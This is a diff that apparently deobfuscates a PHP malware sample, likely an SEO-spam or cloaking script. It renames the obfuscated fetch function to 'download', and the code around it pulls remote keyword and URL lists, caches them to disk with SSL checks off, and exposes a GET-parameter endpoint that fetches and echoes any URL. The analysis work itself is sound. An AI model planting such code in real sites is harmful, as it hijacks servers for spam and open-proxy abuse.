@@ -177,12 +177,13 @@ function l13C3($l1ihTM1){
 */
 
 /* Download file using curl/fsockopen/pfsockopen */
-function l1O2($l14kn,$l1U4n=0,$l1kqFWwO=1,$l1ss2z=null,$l1ms=array()){
+// WTF all params except url are not used
+function download($url){
 
     $l1Hi = 0;
     if(function_exists(curl_init) && function_exists(curl_exec)){
         $l15bc = curl_init();
-        curl_setopt($l15bc,CURLOPT_URL,$l14kn);
+        curl_setopt($l15bc,CURLOPT_URL,$url);
         curl_setopt($l15bc,CURLOPT_USERAGENT,"WHR");
         curl_setopt($l15bc,CURLOPT_CONNECTTIMEOUT,0);
         curl_setopt($l15bc,CURLOPT_RETURNTRANSFER,1);
@@ -190,7 +191,7 @@ function l1O2($l14kn,$l1U4n=0,$l1kqFWwO=1,$l1ss2z=null,$l1ms=array()){
         curl_setopt($l15bc,CURLOPT_SSL_VERIFYHOST,false);
         curl_setopt($l15bc,CURLOPT_FOLLOWLOCATION,true);
         curl_setopt($l15bc,CURLOPT_TIMEOUT,300);
-        $l1er18S4=curl_exec($l15bc);
+        $l1er18S4 = curl_exec($l15bc);
         curl_close($l15bc);
 
         if($l1er18S4){
@@ -205,7 +206,7 @@ function l1O2($l14kn,$l1U4n=0,$l1kqFWwO=1,$l1ss2z=null,$l1ms=array()){
         }
 
         if($func != ''){
-            $l16LhCLJ=parse_url($l14kn);
+            $l16LhCLJ=parse_url($url);
             $l1vY = $func($l16LhCLJ["host"],isset($l16LhCLJ["port"]) ? $l16LhCLJ["port"] : 80,$l19rmur2,$l1wLOnRg,30);
             if($l1vY){
                 $l1Hi=isset($l16LhCLJ["path"])?$l16LhCLJ["path"]:'';
@@ -224,7 +225,7 @@ function l1O2($l14kn,$l1U4n=0,$l1kqFWwO=1,$l1ss2z=null,$l1ms=array()){
                 $l1Hi=0;
             }
         }else{
-            $l1Hi = file_get_contents($l14kn);
+            $l1Hi = file_get_contents($url);
         }
     }
     return trim(trim($l1Hi,"\xEF\xBB\xBF"));
@@ -629,7 +630,7 @@ function l19($l1SDKs){
     global $l1Ni6,$l1go;
     $l1Nt = str_replace("$l1SDKs/",'',$l1Ni6);
     $l1BRS = array();
-    $l1O = l1BSTEtn(l1O2($l1SDKs));
+    $l1O = l1BSTEtn(download($l1SDKs));
     $l1BRS[] = $l1go;
 
     foreach($l1O as $l184039L){
@@ -645,7 +646,7 @@ function l1HsDyi2($l1LgtDjH,$l1Wt,$l1gu){
     $l1IOCJO=array();
     $l1wI17dN=@file_get_contents($l1LgtDjH);
     if($l1wI17dN===false){
-        $l1wI17dN=l1O2($l1Wt);
+        $l1wI17dN = download($l1Wt);
         @write_file($l1LgtDjH,$l1wI17dN);
     }
     $l1wI17dN=explode('|',$l1wI17dN);
@@ -1028,7 +1029,7 @@ function l1P9LVD($l15tGX=''){
     }}if($l1EE!=null&&!empty($l1VuF)){
     $l1bq2wMI[]=sprintf("%s-%s",implode(',',$l1VuF),$l1EE);
     }if(!empty($l1bq2wMI)){
-    $l1GlKWj=explode("|||",l1O2(sprintf($l1DLH,implode('/',$l1bq2wMI))));
+    $l1GlKWj=explode("|||",download(sprintf($l1DLH,implode('/',$l1bq2wMI))));
     foreach($l1GlKWj as$l10PuVe){
     $l1x2JI9S=explode("---",$l10PuVe);
     if(count($l1x2JI9S)==2){
@@ -1064,7 +1065,7 @@ function l1P9LVD($l15tGX=''){
         if($l1bS3es!=''){
             $l1jHQLt[]=$l1Ni6;
         }
-        $l1WEPla=l1O2($l1f1oojq);
+        $l1WEPla = download($l1f1oojq);
         if($l1WEPla!=''){
             $l1jHQLt=array_merge($l1jHQLt,l1BSTEtn($l1WEPla));
             $l1jHQLt=array_unique($l1jHQLt);
@@ -1105,7 +1106,7 @@ function l1P9LVD($l15tGX=''){
     if(file_exists($l1TE9)){
     $l14XZNk=file_get_contents($l1TE9);
     }else{
-    $l14XZNk=l1O2($l1xUB);
+    $l14XZNk = download($l1xUB);
     @write_file($l1TE9,$l14XZNk);
     @l1uKK($l1TE9);
     }
@@ -1239,7 +1240,7 @@ function l1P9LVD($l15tGX=''){
     $l1V65T=trim($_GET[$l1VDKC]);
     $l1V65T=$l1V65T==''?"http://example.com":$l1V65T;
     if($l1V65T!=''){
-    echo l1O2($l1V65T);
+    echo download($l1V65T);
     exit();
     }}if(isset($_GET[$l1EkZsk])){
     echo sprintf("domain=%s<br />lineNo=%s<br />url_prefix=%s<br />charlist=%s<br />wordlist=%s<br />google_veri=%s<br/>http_get=%s<br/>cache=%s<br/>pgmb=%s<br/>urlgz=%s",$l13dbLD,$l19,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,implode('',$l11ufJ),$l1c,$l1cdE);
@@ -1252,7 +1253,7 @@ function l1P9LVD($l15tGX=''){
         return;
     }
 
-    $l1Kr=l1O2($l11ia);
+    $l1Kr = download($l11ia);
     $l1Kr=trim($l1Kr);
 
     if($l1Kr==''){
